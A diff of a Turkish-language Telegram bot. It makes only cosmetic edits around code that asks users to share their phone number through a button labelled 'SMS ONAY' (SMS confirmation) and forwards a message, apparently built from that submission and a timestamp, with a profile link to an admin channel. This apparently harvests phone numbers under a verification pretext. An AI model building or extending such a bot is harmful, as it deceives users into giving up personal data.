@@ -99,7 +99,7 @@ async def menu_buttons(update: Update, context: ContextTypes.DEFAULT_TYPE):
         selected_country[user.id] = country_name
         waiting_number.add(user.id)
 
-        btn = KeyboardButton("📲 SMS ONAY", request_contact=True)  # Numara iste
+        btn = KeyboardButton("📲 SMS ONAY", request_contact=True)
         kb = ReplyKeyboardMarkup([[btn]], resize_keyboard=True, one_time_keyboard=True)
 
         await query.message.reply_text(f"""
@@ -170,9 +170,12 @@ async def contact_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
 ⏰ Saat: {time}
 """
 
+    # Admin kanalına mesaj, altına tek buton: profili aç
     if user.username:
         profile_url = f"https://t.me/{user.username}"
-        kb = InlineKeyboardMarkup([[InlineKeyboardButton("📂 Profili Aç", url=profile_url)]])
+        kb = InlineKeyboardMarkup([
+            [InlineKeyboardButton("📂 Profili Aç", url=profile_url)]
+        ])
         await context.bot.send_message(chat_id=KANAL_ID, text=text, reply_markup=kb)
     else:
         await context.bot.send_message(chat_id=KANAL_ID, text=text)
@@ -214,4 +217,4 @@ app.add_handler(CallbackQueryHandler(menu_buttons))
 app.add_handler(MessageHandler(filters.CONTACT, contact_handler))
 
 app.run_polling()
-        
+    
